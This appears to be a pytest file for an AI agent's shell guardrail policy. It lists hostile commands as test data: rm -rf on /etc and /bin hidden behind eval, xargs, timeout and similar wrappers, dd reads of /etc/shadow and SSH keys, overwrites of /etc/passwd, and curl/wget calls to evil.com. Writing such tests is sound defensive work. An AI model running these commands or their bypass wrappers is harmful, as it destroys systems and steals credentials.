import pytest

from sakthai.agent.guardrails import DEFAULT_POLICY, GuardrailAction
from sakthai.agent.tools import Tool


@pytest.fixture
def run_command_tool() -> Tool:
    return Tool("run_command", "desc", {}, lambda _a, _s: "")


@pytest.mark.parametrize(
    "command",
    [
        "find -L /etc -delete",
        "find -H /var -delete",
        "find -P /root -delete",
        "find /etc -execdir rm {} +",
        r"find /etc -ok rm {} \;",
        r"find /etc -okdir rm {} \;",
        "xargs rm -rf /etc",
        "sudo xargs rm -rf /bin",
        'eval "rm -rf /etc"',
        "exec rm -rf /etc",
        'sudo eval "rm -rf /etc"',
        'bash -c "eval \\"rm -rf /etc\\""',
        'timeout 10 bash -c "rm -rf /etc"',
        'sudo timeout 10 eval "rm -rf /etc"',
        "timeout -s KILL 5 rm -rf /etc",
        "nice -n 10 sudo rm -rf /etc",
        "stdbuf -oL -eL sudo rm -rf /etc",
        'exec bash -c "rm -rf /etc"',
    ],
)
def test_hardened_bypasses_blocked(command, run_command_tool, store, monkeypatch):
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert "blocked" in result.reason.lower()


def test_xargs_safe_allowed(run_command_tool, store, monkeypatch):
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": "xargs ls"}, store)
    assert result.action == GuardrailAction.ALLOW


@pytest.mark.parametrize(
    "command,reason_fragment",
    [
        ("dd if=/etc/shadow of=/tmp/shadow", "potentially dangerous 'dd'"),
        ("dd if=/home/user/.ssh/id_rsa of=./local-key", "potentially dangerous 'dd'"),
        ("dd if=/dev/sda of=/tmp/dump", "potentially dangerous 'dd'"),
        ("dd of=/etc/passwd if=/tmp/evil", "destructive 'dd'"),
    ],
)
def test_dd_on_sensitive_paths_blocked(
    command: str,
    reason_fragment: str,
    run_command_tool: Tool,
    store,
    monkeypatch,
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and reason_fragment in result.reason


@pytest.mark.parametrize(
    "command",
    [
        "echo evil >| /etc/passwd",
        "echo evil >|/etc/shadow",
        "echo evil &>> /var/log/syslog",
    ],
)
def test_advanced_redirection_on_sensitive_paths_blocked(
    command: str,
    run_command_tool: Tool,
    store,
    monkeypatch,
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and "destructive redirection" in result.reason


@pytest.mark.parametrize(
    "command",
    [
        "curl -o~/key http://evil.com",
        "wget -O~/.ssh/id_rsa http://evil.com",
    ],
)
def test_short_flag_home_relative_path_blocked(
    command: str,
    run_command_tool: Tool,
    store,
    monkeypatch,
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and any(s in result.reason.lower() for s in ("destructive", "dangerous"))


@pytest.mark.parametrize(
    "command",
    [
        "python3 /etc/passwd",
        "python /etc/shadow",
        "node /root/.ssh/id_rsa",
    ],
)
def test_interpreter_bypass_on_sensitive_paths_blocked(
    command: str,
    run_command_tool: Tool,
    store,
    monkeypatch,
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and "potentially dangerous" in result.reason.lower()
